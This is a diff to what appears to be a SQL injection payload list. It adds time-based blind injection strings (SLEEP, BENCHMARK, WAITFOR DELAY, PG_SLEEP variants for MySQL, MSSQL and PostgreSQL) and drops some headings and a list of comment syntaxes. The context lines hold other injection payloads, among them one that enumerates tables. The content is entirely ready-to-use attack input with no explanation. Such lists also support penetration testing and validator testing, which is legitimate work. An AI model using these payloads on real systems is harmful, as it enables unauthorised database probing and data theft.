@@ -55,14 +55,25 @@ AND false
 1 AND (SELECT * FROM Users) = 1    
 ' AND MID(VERSION(),1,1) = '5';
 ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
-Finding the table name
-Time-Based:
 ,(select * from (select(sleep(10)))a)
 %2c(select%20*%20from%20(select(sleep(10)))a)
 ';WAITFOR DELAY '0:0:30'--
-Comments:
-#        Hash comment
-/*      C-style comment
--- -    SQL comment
-;%00    Nullbyte
-`        Backtick
+1 OR SLEEP(5)#
+
+' OR SLEEP(5) AND '1'='1'#
+
+1; WAITFOR DELAY '0:0:5'--
+
+' WAITFOR DELAY '0:0:10'--
+
+1 OR BENCHMARK(10000000,MD5(1))#
+
+' OR BENCHMARK(10000000,MD5(1))#
+
+1 OR PG_SLEEP(5)--
+
+' OR PG_SLEEP(5)--
+
+AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'x'='x
+
+1'; IF(1=1) WAITFOR DELAY '0:0:5'--
